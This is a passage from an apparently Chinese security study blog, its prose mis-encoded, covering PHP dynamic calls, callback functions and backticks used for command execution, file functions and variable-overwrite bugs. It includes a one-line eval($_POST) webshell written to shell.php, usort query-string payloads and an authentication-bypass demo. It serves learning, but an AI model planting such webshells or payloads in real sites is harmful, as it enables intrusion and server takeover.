ä¸Šä¸€å¯¹æ‹¬å·ï¼Œé‚£ä¹ˆè§£é‡Šå™¨ä¼šè¯•å›¾å¯»æ‰¾åå­—å’Œè¿™ä¸ªå˜é‡çš„å€¼ä¸€æ ·çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœæ‰¾åˆ°äº†å°±æ‰§è¡Œå®ƒã€‚</p><p>æ‰€ä»¥phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;system(&#x27;whoami&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„å‡½æ•°"><a href="#æ•°ç»„å‡½æ•°" class="headerlink" title="æ•°ç»„å‡½æ•°"></a>æ•°ç»„å‡½æ•°</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªä¸ºä¼ å…¥çš„å‚æ•°æ•°ç»„</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ‰§è¡Œäº†ä¸¤æ¬¡whoamiå‘½ä»¤</p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h3><p>å‚æ•°ä½ç½®æ¢äº†ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¼ å…¥çš„å‚æ•°æ•°ç»„,ç¬¬äºŒä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$cmd</span>, <span class="variable">$func</span>);</span><br></pre></td></tr></table></figure><h3 id="usortã€uasort"><a href="#usortã€uasort" class="headerlink" title="usortã€uasort"></a>usortã€uasort</h3><p>PHP&lt;7</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;system&#x27;</span>);    <span class="comment">//xxx.php?1=1&amp;2=whoami</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);  <span class="comment">//xxx.php?1[]=test&amp;1[]=phpinfo();&amp;2=assert</span></span><br></pre></td></tr></table></figure><h1 id="å‘½ä»¤æ‰§è¡Œå‡½æ•°"><a href="#å‘½ä»¤æ‰§è¡Œå‡½æ•°" class="headerlink" title="å‘½ä»¤æ‰§è¡Œå‡½æ•°"></a>å‘½ä»¤æ‰§è¡Œå‡½æ•°</h1><h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()å’Œåå¼•å·</span><br><span class="line"><span class="title function_ invoke__">popen</span>()ï¼Œ<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤æœ‰å›æ˜¾</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( å‘½ä»¤ï¼Œç»“æœæ•°ç»„ ï¼ŒçŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># é»˜è®¤æ— å›æ˜¾ï¼Œè¦æƒ³è·å¾—ç»“æœï¼Œå°±è¦è¾“å‡ºç¬¬äºŒä¸ªå‚æ•°</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># å‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„çŠ¶æ€ç ä¸º0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h2 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( å‘½ä»¤, çŠ¶æ€ç  )</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯æ‰§è¡Œäº†<code>sh -c &quot;command&quot;</code>å‘½ä»¤</p><p><strong>system()å‡½æ•°</strong>æ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( å‘½ä»¤, çŠ¶æ€ç   )</span><br></pre></td></tr></table></figure><p>å’Œ<strong>systemå‡½æ•°</strong>ç±»ä¼¼ï¼Œæ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="shell-exec-å’Œ-åå¼•å·"><a href="#shell-exec-å’Œ-åå¼•å·" class="headerlink" title="shell_exec()å’Œ åå¼•å·"></a><strong>shell_exec()å’Œ åå¼•å·</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( å‘½ä»¤ )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()å‡½æ•°</strong>é»˜è®¤æ— å›æ˜¾ï¼Œé€šè¿‡ <strong>echo</strong> å¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åæ’‡å· () æ“ä½œç¬¦çš„å˜ä½“ï¼Œå½“ç¦ç”¨shell_execæ—¶ï¼Œ&#96; ä¹Ÿä¸å¯æ‰§è¡Œ</strong></p><p>åå¼•å·åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>å‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œçš„å‘½ä»¤**<code>command</code><strong>ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æŒ‡é’ˆæ–‡ä»¶çš„è¿æ¥æ¨¡å¼</strong><code>mode</code>**ï¼Œæœ‰<code>r</code>å’Œ<code>w</code>ä»£è¡¨è¯»å’Œå†™ã€‚</p><p>å‡½æ•°ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proc-open-å‡½æ•°"><a href="#proc-open-å‡½æ•°" class="headerlink" title="proc_open()å‡½æ•°"></a>proc_open()å‡½æ•°</h2><p>ä¸<code>popen()</code>ç±»ä¼¼ï¼Œåªæ˜¯å¯ä»¥å¼€ä¸¤ä¸ªç®¡é“ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å…¥ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//æ ‡å‡†è¾“å‡ºå†…å®¹ </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//æ ‡å‡†è¾“å‡ºé”™è¯¯ </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//æ‰“å¼€ä¸€ä¸ªè¿›ç¨‹é€šé“ </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//ä¸ºä»€ä¹ˆæ˜¯$pipes[1]ï¼Œå› ä¸º1æ˜¯è¾“å‡ºå†…å®¹ stream_get_contents â€” è¯»å–èµ„æºæµåˆ°ä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="æ–‡ä»¶æ“ä½œå‡½æ•°"><a href="#æ–‡ä»¶æ“ä½œå‡½æ•°" class="headerlink" title="æ–‡ä»¶æ“ä½œå‡½æ•°"></a>æ–‡ä»¶æ“ä½œå‡½æ•°</h1><p><a href="https://www.php.net/manual/zh/ref.filesystem.php">https://www.php.net/manual/zh/ref.filesystem.php</a></p><h2 id="fopen-æ¨¡å¼"><a href="#fopen-æ¨¡å¼" class="headerlink" title="fopen() æ¨¡å¼"></a>fopen() æ¨¡å¼</h2><table><thead><tr><th align="left">:-</th><th>-</th></tr></thead><tbody><tr><td align="left"><code>r</code></td><td>è¯»</td></tr><tr><td align="left"><code>r+</code></td><td>è¯»å†™ï¼Œå‰ç½®</td></tr><tr><td align="left"><code>w</code></td><td>å†™å…¥ï¼Œæˆªæ–­</td></tr><tr><td align="left"><code>w+</code></td><td>è¯»å†™ï¼Œæˆªæ–­</td></tr><tr><td align="left"><code>a</code></td><td>å†™ï¼Œè¿½åŠ </td></tr><tr><td align="left"><code>a+</code></td><td>è¯»å†™ï¼Œè¿½åŠ </td></tr></tbody></table><h2 id="å†™å…¥æ–‡ä»¶"><a href="#å†™å…¥æ–‡ä»¶" class="headerlink" title="å†™å…¥æ–‡ä»¶"></a>å†™å…¥æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;a&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="comment"># FILE_APPEND:æ•°æ®è¿½åŠ ï¼Œè€Œä¸æ˜¯è¦†ç›–</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(filename)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(filename,é»˜è®¤<span class="literal">false</span>)  <span class="literal">false</span>:æ‰ä¼šå°†å†…å®¹æ‰“å°å‡ºæ¥</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(filename)</span><br><span class="line">    </span><br><span class="line">å‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h2 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; has been deleted.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File &#x27;<span class="subst">$filename</span>&#x27; does not exist.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å¤åˆ¶æ–‡ä»¶"><a href="#å¤åˆ¶æ–‡ä»¶" class="headerlink" title="å¤åˆ¶æ–‡ä»¶"></a>å¤åˆ¶æ–‡ä»¶</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">copy</span>(æºæ–‡ä»¶,ç›®çš„æ–‡ä»¶)</span><br></pre></td></tr></table></figure><h2 id="è¯»å–ç›®å½•"><a href="#è¯»å–ç›®å½•" class="headerlink" title="è¯»å–ç›®å½•"></a>è¯»å–ç›®å½•</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>)ç­‰ä»·äº<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>)éƒ½æ˜¯å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">ä»¥æ•°ç»„çš„å½¢å¼è¿”å›</span><br></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•"><a href="#æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•" class="headerlink" title="æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•"></a>æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob() ç±»ä¼¼äºfind</span><br><span class="line">ä»¥æ•°ç»„çš„å½¢å¼è¿”å›</span><br></pre></td></tr></table></figure><p><img src="E:/blog/source/images/image-20220730140323897-1687422810163.png" alt="image-20220730140323897"></p><h1 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h1><ul><li><p><code>extract()</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?auth=true</span></span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auth</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;over&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>import_request_variables()</code>â€“php&lt;5.4.0</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Gä»£è¡¨GETï¼ŒPä»£è¡¨POSTï¼ŒCä»£è¡¨COOKIE</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>( <span class="string">&#x27;G&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># xx.php?auth=1</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private! &quot;</span>;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public! &quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><code>$$</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span> &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;hello world hello world  <span class="comment"># $&#123;$a&#125;ç­‰åŒäº$hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­˜åœ¨å˜é‡è¦†ç›–Demo</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>parse_str(query,variabal)</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¨èç”¨æ³•</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>];  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸å»ºè®®è¿™ä¹ˆç”¨</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>;  <span class="comment">// value</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo bar</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="ç”¨æˆ·ä¼ å‚"><a href="#ç”¨æˆ·ä¼ å‚" class="headerlink" title="ç”¨æˆ·ä¼ å‚"></a>ç”¨æˆ·ä¼ å‚</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span> </span><br><span class="line"><span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_COOKIE</span> </span><br><span class="line"><span class="variable">$_REQUEST</span> </span><br><span class="line"><span class="variable">$_FILES</span> </span><br><span class="line"><span class="variable">$_SERVER</span> </span><br><span class="line"><span class="variable">$GLOBALS</span></span><br></pre></td></tr></table></figure><h3 id="SERVER-xx"><a href="#SERVER-xx" class="headerlink" title="$_SERVER[xx]"></a>$_SERVER[xx]</h3><p>è·å–å½“å‰urlè·¯å¾„çš„å‡½æ•°åŠæœåŠ¡å™¨å˜é‡</p><p><a href="https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html">https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]ï¼šæŸ¥è¯¢(query)çš„å­—ç¬¦ä¸²</span><br><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>]ï¼šå½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure><h2 id="è·å–æ‰€æœ‰å˜é‡-x2F-å‡½æ•°-x2F-å¸¸é‡"><a href="#è·å–æ‰€æœ‰å˜é‡-x2F-å‡½æ•°-x2F-å¸¸é‡" class="headerlink" title="è·å–æ‰€æœ‰å˜é‡&#x2F;å‡½æ•°&#x2F;å¸¸é‡"></a>è·å–æ‰€æœ‰å˜é‡&#x2F;å‡½æ•°&#x2F;å¸¸é‡</h2><ul><li><a href="https://www.php.net/manual/zh/function.get-defined-functions.php"><strong>get_defined_functions</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-constants.php"><strong>get_defined_constants</strong></a></li><li><a href="https://www.php.net/manual/zh/function.get-defined-vars.php"><strong>get_defined_vars</strong></a></li></ul><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="å¤§å°å†™"><a href="#å¤§å°å†™" class="headerlink" title="å¤§å°å†™"></a>å¤§å°å†™</h2><p>åœ¨ PHP ä¸­ï¼Œå…³é”®å­—ï¼ˆä¾‹å¦‚<code>if</code>ã€ <code>else</code>ã€<code>while</code>ã€ <code>echo</code>ç­‰ï¼‰ã€ç±»ã€å‡½æ•°å’Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ã€‚</p><p>ä½†æ˜¯æ‰€æœ‰å˜é‡åéƒ½åŒºåˆ†å¤§å°å†™ï¼</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ECHO <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line">EcHo <span class="string">&quot;Hello World!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;Hello World!</span><br></pre></td></tr></table></figure><h2 id="PHPæ¥æ”¶å‚æ•°"><a href="#PHPæ¥æ”¶å‚æ•°" class="headerlink" 